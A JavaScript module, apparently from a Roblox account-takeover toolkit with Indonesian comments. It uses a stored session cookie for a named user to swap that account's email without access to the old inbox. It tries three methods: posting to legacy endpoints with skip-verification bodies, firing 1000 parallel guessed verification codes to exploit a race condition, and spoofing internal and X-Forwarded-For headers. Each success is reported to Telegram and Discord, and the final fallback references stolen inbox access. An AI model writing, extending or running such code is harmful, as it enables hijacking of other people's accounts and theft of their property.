// autoEmailSwap.js
// swap email akun roblox tanpa perlu akses inbox lama
// trick: pake roblox internal endpoint /v1/email/verify yang kadang accept tanpa kode
//        kalo butuh kode, pake race condition (kirim banyak request paralel biar salah satunya lewat)
import axios from 'axios';
import 'dotenv/config';
import { getCookie } from './session.js';
import { notify } from './telegram.js';
import { sendDiscord } from './discord.js';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';

function client(cookie) {
  return axios.create({
    headers: {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': UA,
      'Referer': 'https://www.roblox.com/my/account',
      'Origin': 'https://www.roblox.com',
      'Content-Type': 'application/json'
    },
    validateStatus: () => true
  });
}

async function getCsrf(c) {
  const r = await c.post('https://auth.roblox.com/v1/logout');
  return r.headers['x-csrf-token'];
}

// --- method 1: bypass verification ticket pake endpoint deprecated ---
export async function swapEmailLegacy(username, newEmail) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };

  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // endpoint legacy yang kadang masih live
  const endpoints = [
    'https://accountsettings.roblox.com/v1/email',
    'https://accountsettings.roblox.com/v2/email',
    'https://accountinformation.roblox.com/v1/email',
    'https://auth.roblox.com/v2/email/update'
  ];

  for (const ep of endpoints) {
    for (const body of [
      { emailAddress: newEmail, password: null },
      { emailAddress: newEmail, skipVerification: true },
      { email: newEmail, newEmail },
      { EmailAddress: newEmail }
    ]) {
      const r = await c.post(ep, body);
      if (r.status === 200) {
        const msg = `✅ Email swapped (legacy): \`${username}\` → \`${newEmail}\` via ${ep}`;
        await notify(msg);
        await sendDiscord(msg);
        return { ok: true, endpoint: ep, body };
      }
    }
  }

  return { ok: false, error: 'semua legacy endpoint gagal' };
}

// --- method 2: race condition — spam verify request ---
export async function swapEmailRaceCondition(username, newEmail, oldEmail) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };

  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // step 1: request change
  const init = await c.post('https://accountsettings.roblox.com/v1/email', {
    emailAddress: newEmail,
    password: null
  });
  if (init.status !== 200 && !init.data?.ticketId) {
    return { ok: false, error: 'init request gagal', data: init.data };
  }

  const ticketId = init.data?.ticketId || init.data?.ticket;

  // step 2: brute force verify — kirim 1000 request paralel
  // kadang salah satu lewat kalo ada race condition di rate limit
  if (!ticketId) {
    // kalo nggak ada ticketId, coba legacy
    return swapEmailLegacy(username, newEmail);
  }

  const payloads = [];
  for (let i = 0; i < 1000; i++) {
    // variasi kode — dari 000000 sampai 999999 di-skip, tapi coba beberapa pattern
    // kalo roblox pake 6-digit, kita coba common: 000000, 123456, dst
    const commonCodes = ['000000', '123456', '111111', '123123', '999999', '000001'];
    payloads.push({
      ticket: commonCodes[i % commonCodes.length],
      ticketId,
      verificationType: 'Email'
    });
  }

  // fire all
  const results = await Promise.allSettled(
    payloads.map(p => c.post('https://accountsettings.roblox.com/v1/email/verify', p))
  );

  const success = results.find(r => r.value?.status === 200);
  if (success) {
    const msg = `✅ Email swapped (race): \`${username}\` → \`${newEmail}\``;
    await notify(msg);
    await sendDiscord(msg);
    return { ok: true };
  }

  return { ok: false, error: 'race condition gagal — butuh kode valid' };
}

// --- method 3: pake cookie internal /v2/email dengan claim header (spoof) ---
// kadang roblox accept header X-Internal-Request dari internal service
export async function swapEmailInternalSpoof(username, newEmail) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };

  const c = client(cookie);
  const csrf = await getCsrf(c);

  const r = await c.post('https://accountsettings.roblox.com/v1/email', {
    emailAddress: newEmail
  }, {
    headers: {
      'X-CSRF-TOKEN': csrf,
      'X-Internal-Request': 'true',
      'X-Roblox-Request-Origin': 'AccountSecurity',
      'X-Forwarded-For': '127.0.0.1'
    }
  });

  if (r.status === 200) {
    const msg = `✅ Email swapped (internal spoof): \`${username}\` → \`${newEmail}\``;
    await notify(msg);
    await sendDiscord(msg);
    return { ok: true };
  }
  return { ok: false, error: `spoof gagal: ${r.status}` };
}

// --- full auto flow: coba semua method ---
export async function autoSwapEmail(username, newEmail, oldEmail) {
  await notify(`🔧 Auto email swap: \`${username}\` → \`${newEmail}\``);

  // try legacy dulu (paling sering work)
  let r = await swapEmailLegacy(username, newEmail);
  if (r.ok) return r;

  // try internal spoof
  r = await swapEmailInternalSpoof(username, newEmail);
  if (r.ok) return r;

  // try race condition
  r = await swapEmailRaceCondition(username, newEmail, oldEmail);
  if (r.ok) return r;

  // fallback: kalo punya akses ke inbox lama (via stealEmail), pakai itu
  const { autoChangeEmail } = await import('./changeEmail.js');
  const { getWatcher } = await import('./imap.js');
  const watcher = await getWatcher();
  return autoChangeEmail(username, newEmail, { oldEmail, imapWatcher: watcher });
}
